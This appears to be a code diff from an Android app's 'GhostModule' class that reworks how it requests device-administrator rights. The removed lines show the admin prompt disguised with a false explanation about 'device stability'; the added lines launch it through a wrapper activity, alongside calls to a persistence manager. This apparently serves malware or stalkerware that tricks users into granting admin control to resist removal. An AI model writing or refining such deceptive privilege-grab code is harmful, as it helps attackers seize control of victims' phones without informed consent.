@@ -674,12 +674,10 @@ public class GhostModule extends BaseModule {
                         IO_Persistence_Manager.setAutoPilot(true);
                         IO_Persistence_Manager.stopSmartExit();
 
-                        android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
-                        Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
-                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
-                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        context.startActivity(intent);
+                        Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
+                        wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                        wrapperIntent.putExtra("launch_admin", true);
+                        context.startActivity(wrapperIntent);
                     } catch (Exception e) {
                         android.util.Log.e("GhostModule", "Failed to launch device admin: " + e.getMessage());
                     }
